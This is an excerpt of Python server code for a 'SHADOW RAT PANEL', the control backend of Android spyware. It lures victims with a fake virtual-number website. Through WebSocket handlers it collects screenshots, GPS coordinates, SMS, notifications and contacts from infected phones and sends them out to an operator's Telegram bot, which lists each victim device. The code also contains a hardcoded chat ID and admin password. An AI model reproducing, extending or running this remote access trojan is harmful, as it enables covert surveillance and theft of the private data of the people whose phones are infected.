...
TELEGRAM_CHAT_IDS = ['7848300179']  # Multiple IDs add kar sakta hai
ADMIN_PASSWORD_HASH = hashlib.sha256('shadow749926n'.encode()).hexdigest()
...
def send_telegram_document(document_data, filename, caption=""):
...
# DEVICE MANAGEMENT
# ============================================
connected_devices = {}  # In-memory active connections
def get_devices():
...
# ============================================
# VIRTUAL NUMBERS DATA (1000+ Fake Numbers)
# ============================================
def get_virtual_numbers():
    ...
    for country in countries:
        for i in range(35):  # 35 numbers per country = 1050+ total
...
# ============================================
# ROUTES - VIRTUAL NUMBER WEBSITE (PUBLIC)
# ============================================
@app.route('/')
def index():
...
# ============================================
# SOCKET.IO - DEVICE CONNECTION (WebSocket)
# ============================================
@socketio.on('connect')
def handle_connect():
...
def handle_disconnect():
    ...
    if device_id:
        ...
        send_telegram_message(
            ...
            f"📱 Model: <b>{device.get('model', 'Unknown')}</b>\n"
            f"🔋 Battery: {device.get('battery', 'N/A')}\n"
...
def handle_screenshot(data):
    ...
    if screenshot_b64:
        ...
        try:
            ...
            send_telegram_photo(img_data, caption)
        except:
            pass
...
def handle_location(data):
    ...
    send_telegram_message(
        ...
        f"📱 Device: <b>{device.get('model', 'Unknown')}</b>\n"
        f"🗺️ Latitude: <code>{lat}</code>\n"
        f"🗺️ Longitude: <code>{lon}</code>\n"
    ...
    if data and 'message' in data:
        ...
        if chat_id in TELEGRAM_CHAT_IDS:
            if text == '/start':
                ...
                reply = (
                    f"🎛️ <b>SHADOW RAT PANEL</b>\n\n"
                    f"📊 Stats:\n"
                    f"• Total Devices: {len(devices)}\n"
                    f"• Online: {online}\n"
                    f"• Offline: {len(devices) - online}\n\n"
                    f"📱 Devices:\n"
                )
                for did, d in devices.items():
                    status = "🟢" if d.get('status') == 'online' else "🔴"
                    reply += f"{status} {d.get('model', 'Unknown')} - {did[:8]}...\n"

                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                    json={'chat_id': chat_id, 'text': reply, 'parse_mode': 'HTML'}
                )
            elif text.startswith('/device_'):
                did = text.replace('/device_', '')
                history = get_device_history(did)
                device = history['device']
                reply = (
                    f"📱 <b>DEVICE: {device.get('model', 'Unknown')}</b>\n"
                    f"Status: {'🟢 Online' if device.get('status') == 'online' else '🔴 Offline'}\n"
                    f"Battery: {device.get('battery', 'N/A')}\n"
                    f"Android: {device.get('version', 'N/A')}\n\n"
                    f"📨 SMS: {len(history['sms'])}\n"
                    f"🔔 Notifications: {len(history['notifications'])}\n"
                    f"👥 Contacts: {len(history['contacts'])}\n"
                    f"📸 Screenshots: {len(history['screenshots'])}"
                )
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                    json={'chat_id': chat_id, 'text': reply, 'parse_mode': 'HTML'}
